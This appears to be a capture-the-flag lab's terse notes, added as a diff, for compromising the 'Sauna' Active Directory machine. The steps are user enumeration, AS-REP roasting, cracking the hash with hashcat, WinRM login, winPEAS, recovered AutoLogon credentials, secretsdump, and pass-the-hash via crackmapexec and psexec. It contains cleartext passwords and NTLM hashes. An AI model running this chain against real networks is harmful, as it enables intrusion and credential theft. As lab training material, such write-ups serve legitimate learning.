@@ -1,0 +1,39 @@
+Sauna
+
+domain:EGOTISTICAL-BANK.LOCAL
+
+Users:
+
+Fergus Smith 
+Shaun Coins 
+Sophie Driver 
+Bowie Taylor 
+Hugo Bear 
+
+
+2020/07/18 19:26:07 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
+2020/07/18 19:26:07 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
+
+
+Grab hash
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4d700c72e1ba3bff5ce508d57a5eca9d$6f398f92ecfe52f155d094c2a7593268f5e6c095e587c1f029bb9a40dca78bed9853fd0baaab116531dc65c67eb12c80035b39280c59b2c3ee0299c41e2ee47218ad091de4a3a92390c6614f54774f25f59dbc8b278d33eea3995792f71cca47643e347d3d21fe53e0f26f7144bf8539018ef93823c334993e57d0ebf1d1b6aea6d440dc7f7f4142ac15a2325d77c96eecab79b5b7f7a8f1b35a3afd912d498066a90ffaa4b4b575034b25e4e286cc722f520794298c952dea65c4ed0e5d8cf5db0dd67ab54e7e861010cb64cc2d85f121a78719887e1eabbbd24f6f8fdaa5291ebdc591e752fa763f82f6e67fa43129d6f36bcfdffef163a0e0fd0cc0c4d949
+
+
+$ hashcat --example-hashes | grep asrep
+$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt 
+
+fsmith:Thestrokes23
+
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+
+--upload winPEAS.exe
+Some AutoLogon credentials were found!!                                           
+
+svc_loanmanager:Moneymakestheworldgoround! 
+
+
+Pash the hash attack
+secretsdump.py egotistical-bank.local/svc_loanmgr@10.10.10.175
+crackmapexec smb 10.10.10.75 -u administrator -H aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
+crackmapexec smb 10.10.10.175 -u administrator -H aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
+psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
